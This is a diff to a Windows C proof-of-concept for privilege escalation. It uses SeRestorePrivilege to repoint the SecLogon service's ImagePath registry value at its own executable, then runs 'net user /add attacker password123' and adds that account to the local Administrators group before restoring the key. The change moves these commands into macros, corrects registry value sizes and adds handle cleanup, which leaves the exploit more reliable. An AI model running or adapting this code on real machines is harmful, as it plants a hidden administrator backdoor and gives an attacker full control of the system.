@@ -22,8 +22,13 @@
 
 // ############################## Enums ##############################
 
-#define SECLOGON_REG_KEY      L"SYSTEM\\CurrentControlSet\\Services\\SecLogon"
-#define SECLOGON_SERVICE_NAME L"Seclogon"
+#define SECLOGON_REG_KEY         L"SYSTEM\\CurrentControlSet\\Services\\SecLogon"
+#define SECLOGON_SERVICE_NAME    L"Seclogon"
+#define SECLOGON_IMAGE_PATH_NAME L"ImagePath"
+#define SECLOGON_IMAGE_PATH      L"%windir%\\system32\\svchost.exe -k netsvcs -p"
+
+#define COMMAND_1 L"cmd /c net user /add attacker password123"
+#define COMMAND_2 L"cmd /c net localgroup administrators attacker /add"
 
 typedef enum
 {
@@ -123,8 +128,8 @@ wmain (INT iArgc, PWCHAR *ppArgv)
         // user and add it to the Administrators group. You'd also probably
         // do it with the win32 API and not _wsystem. This is just for
         // demonstration purposes.
-        _wsystem(L"cmd /c net user /add attacker password123");
-        _wsystem(L"cmd /c net localgroup administrators attacker /add");
+        _wsystem(COMMAND_1);
+        _wsystem(COMMAND_2);
         Status = ResetRegKey();
         if (STATUS_SUCCESS != Status)
         {
@@ -161,13 +166,7 @@ SetRestorePrivilege ()
     HANDLE hToken   = NULL;
 
     hProcess = GetCurrentProcess();
-    if (NULL == hProcess)
-    {
-        PRINT_ERROR("GetCurrentProcess failed");
-        goto EXIT;
-    }
-
-    bStatus = OpenProcessToken(
+    bStatus  = OpenProcessToken(
         hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
     if (FALSE == bStatus)
     {
@@ -258,11 +257,12 @@ SetSelfAsRegKey ()
     }
 
     lStatus = RegSetValueExW(hKey,
-                             L"ImagePath",
+                             SECLOGON_IMAGE_PATH_NAME,
                              0,      // Reserved
                              REG_SZ, // Type
                              (PBYTE)szExePath,
-                             sizeof(szExePath));
+                             (wcslen(szExePath) + 1)
+                                 * sizeof(WCHAR)); // +1 for null terminator
     if (ERROR_SUCCESS != lStatus)
     {
         PRINT_ERROR("RegSetValueExW failed");
@@ -271,6 +271,10 @@ SetSelfAsRegKey ()
 
     Status = STATUS_SUCCESS;
 EXIT:
+    if (NULL != hKey)
+    {
+        RegCloseKey(hKey);
+    }
     return Status;
 } // SetSelfAsRegKey
 
@@ -304,13 +308,13 @@ ResetRegKey ()
         goto EXIT;
     }
 
-    lStatus = RegSetValueExW(
-        hKey,
-        L"ImagePath",
-        0,             // Reserved
-        REG_EXPAND_SZ, // Type
-        (PBYTE)L"%windir%\\system32\\svchost.exe -k netsvcs -p",
-        sizeof(L"%windir%\\system32\\svchost.exe -k netsvcs -p"));
+    lStatus = RegSetValueExW(hKey,
+                             SECLOGON_IMAGE_PATH_NAME,
+                             0,             // Reserved
+                             REG_EXPAND_SZ, // Type
+                             (PBYTE)SECLOGON_IMAGE_PATH,
+                             (wcslen(SECLOGON_IMAGE_PATH) + 1)
+                                 * sizeof(WCHAR)); // +1 for null terminator
     if (ERROR_SUCCESS != lStatus)
     {
         PRINT_ERROR("RegSetValueExW failed");
@@ -319,6 +323,10 @@ ResetRegKey ()
 
     Status = STATUS_SUCCESS;
 EXIT:
+    if (NULL != hKey)
+    {
+        RegCloseKey(hKey);
+    }
     return Status;
 } // ResetRegKey
 
